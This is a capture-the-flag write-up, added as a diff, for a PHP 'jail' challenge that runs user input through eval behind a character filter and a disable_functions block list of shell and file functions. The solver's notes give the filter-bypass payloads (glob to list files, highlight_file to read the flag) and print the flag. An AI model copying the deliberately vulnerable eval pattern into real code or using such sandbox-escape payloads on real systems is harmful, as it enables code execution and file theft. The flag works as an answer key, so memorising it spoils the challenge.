@@ -1,0 +1,46 @@
+Challenge PHP code:                                                                                                                                                                                                                            
+-----------------------------                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                               
+WARNING: the PHP interpreter is launched using php -c php.ini jail.php.                                                                                                                                                                        
+The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"                                                  
+                                                                                                                                                                                                                                               
+<?php                                                                                                                                                                                                                                          
+array_shift($_SERVER['argv']);
+$var = implode(" ", $_SERVER['argv']);                                                 
+
+if($var == null) die("PHP Jail need an argument\n");                                   
+
+function filter($var) {                                                                                                                                                       
+        if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
+                return false;
+        }                                                                                                                                                                                                                                      
+        return true;\                                                    
+}                                                                                                                                                                                                                                              
+if(filter($var)) {                                            
+        eval($var);                                                               
+        echo "Command executed";
+} else {                                                                               
+        echo "Restricted characters has been used";
+}
+echo "\n";
+?>
+
+-----------------------------
+
+no more popen :(
+All those are removed : 
+exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file
+
+We can list all files :
+	print_r(glob('*'));
+
+We get the list of all available php commands from here : https://www.php.net/manual/en/indexes.functions.php
+
+Filter it to revmove restricted characters
+
+Lookup through it to find a usefull command
+
+We use the highlight_file command to retrieve the flag :
+	print(highlight_file(glob('*')[0]));
+
+FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H
